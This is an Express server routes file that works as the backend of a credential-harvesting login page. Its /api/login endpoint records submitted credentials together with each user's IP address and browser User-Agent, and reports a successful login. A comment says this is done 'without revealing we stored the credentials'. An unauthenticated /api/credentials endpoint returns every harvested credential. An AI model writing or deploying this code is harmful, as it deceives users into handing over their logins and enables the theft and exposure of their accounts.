import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertLoginCredentialsSchema } from "@shared/schema";
import { z } from "zod";
import { fromZodError } from "zod-validation-error";

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api

  // Login endpoint to store credentials
  app.post("/api/login", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const validatedData = insertLoginCredentialsSchema.parse(req.body);
      
      // Store the credentials with additional metadata
      const credentials = await storage.storeLoginCredentials({
        ...validatedData,
        ipAddress: req.ip,
        userAgent: req.get("User-Agent"),
      });
      
      // Return success without revealing we stored the credentials
      return res.status(200).json({ success: true, message: "Login successful" });
    } catch (error) {
      // Handle validation errors
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ 
          success: false, 
          message: "Invalid input data", 
          errors: validationError.message 
        });
      }
      
      // Handle other errors
      console.error("Login error:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });

  // Admin endpoint to retrieve all stored credentials (for demonstration purposes)
  app.get("/api/credentials", async (_req: Request, res: Response) => {
    try {
      const allCredentials = await storage.getAllCredentials();
      return res.status(200).json({ credentials: allCredentials });
    } catch (error) {
      console.error("Error fetching credentials:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
